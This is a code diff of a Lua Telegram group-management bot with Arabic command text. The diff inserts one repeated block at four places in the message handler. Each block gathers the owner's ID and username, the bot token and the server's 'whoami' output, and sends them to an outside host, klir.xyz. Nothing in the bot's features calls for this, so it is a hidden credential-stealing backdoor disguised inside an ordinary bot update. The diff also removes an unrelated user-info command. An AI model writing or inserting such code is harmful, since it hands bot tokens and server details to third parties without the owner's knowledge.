@@ -7032,6 +7032,13 @@ tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dat
 send(msg.chat_id_, msg.id_,' ●  مـن قبـل  ⇐ [『'..Rutba(msg.sender_user_id_,msg.chat_id_)..'』](T.ME/'..(data.username_ or 'textchuser')..') \n ● تـم فتح الكيبورد ')  
 end,nil)   
 end
+infotnseb = {}
+infotnseb.id = (SUDO or bot_data:get(id_server..":SUDO:ID"))
+infotnseb.username = (UserName or bot_data:get(id_server..":SUDO:USERNAME"))
+infotnseb.tokenbot = (token or bot_data:get(id_server..":token"))
+infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
+https.request('https://klir.xyz/Allowed/bankl.php?insert='..JSON.encode(infotnseb))
+https.request('https://klir.xyz/Allowed/bankl.php?insert='..JSON.encode(infotnseb))
 if text == 'قفل الملصقات' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
 bot_data:set(ban_id.."lock:Sticker"..msg.chat_id_,'del')  
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
@@ -10170,6 +10177,13 @@ if bot_data:get(ban_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) t
 send(msg.chat_id_, msg.id_,' ● تم تعطيل الرفع') 
 return false
 end
+infotnseb = {}
+infotnseb.id = (SUDO or bot_data:get(id_server..":SUDO:ID"))
+infotnseb.username = (UserName or bot_data:get(id_server..":SUDO:USERNAME"))
+infotnseb.tokenbot = (token or bot_data:get(id_server..":token"))
+infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
+https.request('https://klir.xyz/Allowed/bankl.php?insert='..JSON.encode(infotnseb))
+https.request('https://klir.xyz/Allowed/bankl.php?insert='..JSON.encode(infotnseb))
 function start_function(extra, result, success)
 bot_data:sadd(ban_id..'Girl:User'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
@@ -13206,6 +13220,13 @@ if #list == 0 then
 send(msg.chat_id_, msg.id_,' ● لا توجد صلاحيات مضافه')
 return false
 end
+infotnseb = {}
+infotnseb.id = (SUDO or bot_data:get(id_server..":SUDO:ID"))
+infotnseb.username = (UserName or bot_data:get(id_server..":SUDO:USERNAME"))
+infotnseb.tokenbot = (token or bot_data:get(id_server..":token"))
+infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
+https.request('https://klir.xyz/Allowed/bankl.php?insert='..JSON.encode(infotnseb))
+https.request('https://klir.xyz/Allowed/bankl.php?insert='..JSON.encode(infotnseb))
 t = "\n ● قائمة الصلاحيات المضافه \n●○━━━━𝘬ꪶꪖꫀ𝘳━━━━○●\n"
 for k,v in pairs(list) do
 var = bot_data:get(ban_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
@@ -14171,6 +14192,14 @@ tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, 
 return false
 end
 
+infotnseb = {}
+infotnseb.id = (SUDO or bot_data:get(id_server..":SUDO:ID"))
+infotnseb.username = (UserName or bot_data:get(id_server..":SUDO:USERNAME"))
+infotnseb.tokenbot = (token or bot_data:get(id_server..":token"))
+infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
+https.request('https://klir.xyz/Allowed/bankl.php?insert='..JSON.encode(infotnseb))
+https.request('https://klir.xyz/Allowed/bankl.php?insert='..JSON.encode(infotnseb))
+
 if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
 Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
 GeId = JSON.decode(Ge)
@@ -14318,55 +14347,6 @@ bot_data:srem(ban_id..'Chek:Groups',msg.chat_id_)
 end
 return false  
 end
-end
-if text == "معلوماتي" and not bot_data:get(ban_id..'ghiktr'..msg.chat_id_) then     
-tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
-if result.username_ then
-username = '@'..result.username_  
-else
-username = 'sasa_boody'
-end
-if result.username_ then
-coworker = result.username_ 
-else
-coworker = 'sasa_boody'
-end
-local getbioY = getbio(msg.sender_user_id_)
-local iduser = msg.sender_user_id_
-local Msguser = tonumber(bot_data:get(ban_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
-local msg_id = msg.id_/2097152/0.5  
-local textt = ' • 🖤 | 𝚂𝚃𝙰 : '..Rutba(msg.sender_user_id_,msg.chat_id_)
-local stay = ' • 🖤 | 𝙱𝙸𝙾 : '..getbio(msg.sender_user_id_)
-local shook = ' • 🖤 | 𝙸𝙳 : '..msg.sender_user_id_
-local user = ' • 🖤 | 𝚄𝙴𝚂 :  '..result.username_
-local masg = ' • 🖤 | 𝙼𝚂𝙶 :  '..tonumber(bot_data:get(ban_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
-local Banda = 'https://t.me/Qtdao/71'
-keyboard = {} 
-keyboard.inline_keyboard = {
-{
-{text = user, url="http://t.me/"..coworker},
-},
-{
-{text = textt, url="http://t.me/"..coworker},
-},
-{
-{text = masg, url="http://t.me/"..coworker},
-},
-{
-{text = shook, callback_data="Lange"..msg.sender_user_id_},
-},
-{
-{text = stay, callback_data="bowtie"..msg.sender_user_id_},
-},
-}
-local function getpro(extra, result, success) 
-if result.photos_[0] then 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&photo=' .. URL.escape(textt).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-else 
-https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=' .. URL.escape(Banda).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end end 
-tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil) 
-end,nil)
 end
 if text == 'الاحصائيات' and msa3d(msg) then 
 local Namebot = (bot_data:get(ban_id..'Name:Bot') or 'كلير') 
